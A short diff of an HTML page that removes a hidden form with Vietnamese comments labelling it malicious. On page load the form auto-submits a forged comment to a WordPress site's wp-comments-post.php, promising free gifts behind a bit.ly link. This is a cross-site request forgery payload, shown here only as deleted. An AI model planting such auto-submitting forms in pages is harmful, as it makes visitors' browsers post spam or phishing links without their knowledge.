@@ -2918,26 +2918,5 @@
       defer
       data-wp-strategy="defer"
     ></script>
-    <form
-      id="csrfForm"
-      action="https://mydecobox.shop/wp-comments-post.php"
-      method="POST"
-      style="display: none"
-    >
-      <!-- ID bài viết thật -->
-      <input type="hidden" name="comment_post_ID" value="476" />
-      <!-- Nội dung bình luận độc -->
-      <input
-        type="hidden"
-        name="comment"
-        value="Tặng quà miễn phí ở đây nè: https://bit.ly/snaplink 😘"
-      />
-    </form>
-
-    <script>
-      window.onload = () => {
-        document.getElementById("csrfForm").submit();
-      };
-    </script>
   </body>
 </html>
